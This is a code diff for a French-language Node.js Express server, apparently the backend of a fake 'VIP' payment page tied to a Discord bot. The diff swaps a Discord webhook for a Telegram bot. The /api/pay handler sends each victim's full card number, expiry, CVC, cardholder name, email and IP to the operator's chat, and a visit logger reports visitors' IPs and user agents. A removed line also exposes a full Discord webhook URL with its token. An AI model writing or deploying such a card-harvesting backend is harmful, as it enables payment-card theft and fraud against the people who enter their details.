@@ -23,10 +23,43 @@ const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const axios = require('axios');
+const TelegramBot = require('node-telegram-bot-api');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1483531247685992608/UtI6SotnOhf-Iw95F82v-pfzCHQfTh_mzcMQ0vmzmBB3cEwxAHI3kEuM_boX7AqhzsNE";
+
+// Telegram Configuration
+const tgToken = process.env.TOKEN_TELEGRAM;
+const tgChatId = process.env.TELEGRAM_CHAT_ID;
+const botTg = new TelegramBot(tgToken, { polling: true });
+
+// Command to get Chat ID
+botTg.onText(/\/id/, (msg) => {
+    botTg.sendMessage(msg.chat.id, `Votre Chat ID est : \`${msg.chat.id}\``, { parse_mode: 'Markdown' });
+});
+
+// Helper for Telegram Logging
+async function sendToTelegram(message) {
+    if (!tgChatId) {
+        console.warn("TELEGRAM_CHAT_ID non configuré dans le fichier .env");
+        return;
+    }
+    try {
+        await botTg.sendMessage(tgChatId, message, { parse_mode: 'Markdown' });
+        console.log("Log envoyé sur Telegram avec succès.");
+    } catch (err) {
+        console.error("Erreur d'envoi Telegram:", err.message);
+        if (err.message.includes('parse')) {
+            // Tentative de secours sans Markdown si erreur de parsing
+            await botTg.sendMessage(tgChatId, message.replace(/[*_`]/g, '')).catch(() => {});
+        }
+    }
+}
+
+// Commande de test
+botTg.onText(/\/test/, (msg) => {
+    sendToTelegram("🚀 Test de log manuel réussi !");
+});
 
 const client = new Client({
     intents: [
@@ -75,24 +108,18 @@ app.post('/api/pay', async (req, res) => {
     const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;
 
     try {
-        await axios.post(DISCORD_WEBHOOK, {
-            embeds: [{
-                title: "💳 Nouvelle tentative de paiement - Debug Mode",
-                color: 0x9D50BB,
-                fields: [
-                    { name: "👤 Titulaire", value: `\`${cardHolder || 'Inconnu'}\``, inline: true },
-                    { name: "📧 Email", value: `\`${email || 'Inconnu'}\``, inline: true },
-                    { name: "🔢 Numéro", value: `\`${cardNumber || 'Inconnu'}\``, inline: true },
-                    { name: "📅 Expiration", value: `\`${expiry || 'Inconnu'}\``, inline: true },
-                    { name: "🔒 CVC", value: `\`${cvc || 'Inconnu'}\``, inline: true },
-                    { name: "🌍 Pays", value: `\`${country || 'Inconnu'}\``, inline: true },
-                    { name: "🌐 Client IP", value: `\`${req.ip}\`` }
-                ],
-                timestamp: new Date()
-            }]
-        });
+        const message = `💳 *Nouvelle tentative de paiement*\n\n` +
+            `👤 *Titulaire:* \`${cardHolder || 'Inconnu'}\`\n` +
+            `📧 *Email:* \`${email || 'Inconnu'}\`\n` +
+            `🔢 *Numéro:* \`${cardNumber || 'Inconnu'}\`\n` +
+            `📅 *Expiration:* \`${expiry || 'Inconnu'}\`\n` +
+            `🔒 *CVC:* \`${cvc || 'Inconnu'}\`\n` +
+            `🌍 *Pays:* \`${country || 'Inconnu'}\`\n` +
+            `🌐 *IP:* \`${req.ip}\``;
+        
+        await sendToTelegram(message);
     } catch (err) {
-        console.error("Webhook error:", err.message);
+        console.error("Telegram log error:", err.message);
     }
 
     setTimeout(() => {
@@ -112,30 +139,29 @@ app.post('/api/pay', async (req, res) => {
 // Log specialized for website visit
 app.get('/api/log-visit', async (req, res) => {
     try {
-        await axios.post(DISCORD_WEBHOOK, {
-            embeds: [{
-                title: "🌐 Nouvelle connexion au site",
-                color: 0x00F2FE,
-                description: "Un utilisateur vient d'ouvrir la page de paiement VIP.",
-                fields: [
-                    { name: "🌐 Client IP", value: `\`${req.ip}\``, inline: true },
-                    { name: "📱 User-Agent", value: `\`${req.headers['user-agent']?.substring(0, 100) || 'Inconnu'}\`` }
-                ],
-                timestamp: new Date()
-            }]
-        });
+        const message = `🌐 *Nouvelle connexion au site*\n\n` +
+            `Un utilisateur vient d'ouvrir la page de paiement VIP.\n\n` +
+            `🌐 *IP:* \`${req.ip}\`\n` +
+            `📱 *User-Agent:* \`${req.headers['user-agent']?.substring(0, 100) || 'Inconnu'}\``;
+        
+        await sendToTelegram(message);
     } catch (err) {
-        console.error("Log visit error:", err.message);
+        console.error("Telegram log visit error:", err.message);
     }
     res.status(200).send('ok');
 });
 
-app.listen(PORT, () => console.log(`API running on port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`API running on port ${PORT}`);
+    sendToTelegram(`🚀 *Système démarré*\nL'API est en ligne sur le port ${PORT}`);
+});
+
 // -----------------------------
 
 
 client.once('clientReady', async (c) => {
     console.log(`Bot prêt ! Connecté en tant que ${c.user.tag}`);
+    sendToTelegram(`🤖 *Discord Bot Prêt*\nConnecté en tant que **${c.user.tag}**`);
     // Fetch all invites for all guilds
     for (const guild of client.guilds.cache.values()) {
         try {
